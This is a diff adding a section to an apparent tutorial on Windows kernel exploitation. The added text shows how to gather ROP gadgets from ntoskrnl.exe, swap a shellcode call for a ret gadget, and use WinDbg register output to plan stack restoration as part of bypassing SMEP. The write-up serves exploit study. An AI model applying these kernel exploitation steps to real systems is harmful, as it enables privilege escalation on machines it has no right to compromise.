@@ -213,7 +213,44 @@ This is **SMEP** preventing Kernel mode from executing code in user space. We ne
 
 ## Registers and a ROP NOP
 
-todo
+We can use [RP++](https://github.com/0vercl0k/rp) to gather useful ROP gadgets from `ntoskrnl.exe` (take a copy of this from the target `C:\Windows\System32\`:
+
+```
+rp-win.exe -r 5 -f .\ntoskrnl.exe --va 0x0 > gadgets.txt
+```
+
+I generally use [Notepad++](https://notepad-plus-plus.org) to search for useful gadgets. We can find a `ret` gadget and place it in our exploit code (replacing the call to our user space shellcode):
+
+```c
+userData.ObjectType = (ULONG_PTR)kernelBase + 0x639131;
+```
+
+In **WinDbg** we can set a breakpoint on this address:
+
+```
+1: kd> bp nt+0x639131
+```
+
+When we compile and run the exploit on the target **WinDbg** will break at this address, now we can examine the registers when the bug is triggered:
+
+```
+Breakpoint 0 hit
+nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
+fffff800`11039131 c3              ret
+1: kd> r
+rax=0000000000000000 rbx=ffff82862c702190 rcx=5b5c3b6748cd0000
+rdx=0000000000000001 rsi=000000000000004d rdi=0000000000000003
+rip=fffff80011039131 rsp=fffff68fdf3a3718 rbp=ffff8286312fd9d0
+ r8=0000000000000008  r9=000000000000004d r10=000000006b636148
+r11=fffff68fdf3a3718 r12=0000000000000000 r13=0000000000000000
+r14=ffff82862c702190 r15=0000000000000010
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040286
+nt!SymCryptCallbackRandom <PERF> (nt+0x639131):
+fffff800`11039131 c3              ret
+```
+
+Notice that `r11` is the same value as `rsp`. This will come in handy later when we need to restore the stack upon return to the driver code.
 
 ## Stack Pivoting
 
